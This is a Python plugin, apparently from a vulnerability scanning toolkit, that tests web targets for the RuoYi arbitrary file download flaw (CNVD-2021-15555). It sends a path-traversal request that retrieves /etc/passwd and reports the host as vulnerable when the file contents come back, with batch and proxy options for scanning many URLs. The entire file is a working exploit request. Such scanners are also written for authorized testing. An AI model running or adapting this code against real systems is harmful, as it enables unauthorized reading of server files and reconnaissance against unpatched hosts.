#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.outprint import OutPrintInfo,OutPrintInfoSuc
from libs.reqset import ReqSet
urllib3.disable_warnings()


class Cnvd_2021_15555:

    def run(self, urls):
        url = urls + '/common/download/resource?resource=/profile/../../../../../../../../../../etc/passwd'
        header = {
            "Host": urls.split("://")[-1],
            "User-Agent": self.headers,
            "Accept": "*/*",
            "Connection": "Keep-Alive"

        }
        try:
            response = requests.get(url, headers=header, verify=self.ssl, timeout=5,proxies=self.proxy)
            if response.status_code == 200 and "root:" in response.text:
                OutPrintInfoSuc("Ruoyi", '[b bright_red]存在Ruoyi任意文件下载')
                OutPrintInfo("Ruoyi",url)
                if self.batch:
                    OutPrintInfoSuc("Ruoyi", f'存在Ruoyi任意文件下载:{url}')
            else:
                if not self.batch:
                    OutPrintInfo("Ruoyi", f'不存在Ruoyi任意文件下载')

        except Exception:
            if not self.batch:
                OutPrintInfo("Ruoyi", '目标请求出错')
    def main(self, target):
        self.batch = target["batch_work"]

        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(proxy=proxy)
            self.proxy = req["proxy"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
        if not self.batch:
            OutPrintInfo("Ruoyi", '开始执行Ruoyi任意文件下载检测...')
        self.run(url)
        if not self.batch:
            OutPrintInfo("Ruoyi",'Ruoyi任意文件下载检测结束')